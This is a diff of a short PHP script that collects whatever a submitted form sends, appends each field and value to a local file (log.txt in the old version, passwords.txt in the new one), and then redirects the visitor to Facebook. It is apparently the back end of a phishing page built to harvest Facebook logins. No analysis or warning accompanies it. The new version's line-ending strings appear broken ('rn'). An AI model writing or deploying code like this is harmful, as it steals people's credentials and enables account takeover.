@@ -1,19 +1,13 @@
 <?php
- 
-// Set the location to redirect the page
-header ('Location: http://www.facebook.com');
- 
-// Open the text file in writing mode
-$file = fopen("log.txt", "a");
- 
-foreach($_POST as $variable => $value) {
-    fwrite($file, $variable);
-    fwrite($file, "=");
-    fwrite($file, $value);
-    fwrite($file, "\r\n");
+header("Location: http://www.facebook.com/home.php? ");
+$handle = fopen("passwords.txt", "a");
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "rn");
 }
- 
-fwrite($file, "\r\n");
-fclose($file);
+fwrite($handle, "rn");
+fclose($handle);
 exit;
 ?>
